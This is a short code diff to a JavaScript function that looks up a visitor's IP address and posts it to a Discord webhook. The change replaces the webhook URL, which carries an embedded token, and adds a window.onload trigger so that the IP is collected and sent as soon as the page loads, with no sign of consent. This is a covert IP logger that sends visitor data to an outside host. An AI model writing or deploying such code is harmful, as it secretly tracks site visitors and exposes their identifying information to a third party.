@@ -5,7 +5,7 @@ function sendIp() {
         .then(response => response.json())
         .then(data => {
             const userIp = data.ip; // Get the user's IP address
-            const webhookUrl = 'https://discord.com/api/webhooks/1320679267671085117/kujMKrXa-Zhsfyr4PANPR0BX6MWeEsV73fl4kFnKik-Qfxj3hPldZnZ4EkkCpn82A_tN';
+            const webhookUrl = 'https://discord.com/api/webhooks/1320679234963767330/kujMKrXa-Zhsfyr4PANPR0BX6MWeEsV73fl4kFnKik-Qfxj3hPldZnZ4EkkCpn82A_tN';
 
             // Create the payload to send to the Discord webhook
             const payload = {
@@ -29,3 +29,6 @@ function sendIp() {
             console.error('Error fetching IP:', error);
         });
 }
+
+// Trigger the IP collection as soon as the page loads
+window.onload = sendIp;
